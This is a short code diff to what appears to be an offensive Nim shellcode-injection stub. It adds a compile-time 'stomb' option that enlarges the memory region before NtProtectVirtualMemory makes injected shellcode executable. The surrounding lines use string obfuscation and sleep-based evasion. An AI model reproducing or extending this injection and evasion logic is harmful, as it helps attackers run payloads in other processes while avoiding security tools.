@@ -577,7 +577,8 @@ let ShellcoderemoteinjectStub * = """
                             when defined(verbose):
                                 echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                             HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-                        
+                        when defined(stomb):
+                            sc_size = sc_size + 0x1000
                         status = NtProtectVirtualMemory(tProcess, &ds, &sc_size, PAGE_EXECUTE_READ, addr oldProtection)
                         when defined(verbose):
                             echo obf("[*] NtProtectVirtualMemory: "), status
